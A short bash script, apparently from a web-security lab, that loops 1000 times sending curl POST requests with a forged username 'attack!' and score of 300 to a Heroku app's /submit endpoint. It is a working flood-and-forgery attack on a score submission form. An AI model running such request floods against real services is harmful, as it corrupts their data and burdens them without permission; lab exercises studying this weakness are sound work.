#!/bin/bash

for ((i=1; i<=1000; i++))
	do
		curl --data "username=attack!&score=300&grid={}" https://lab8-11-7-18.herokuapp.com/submit
	done
echo "done"

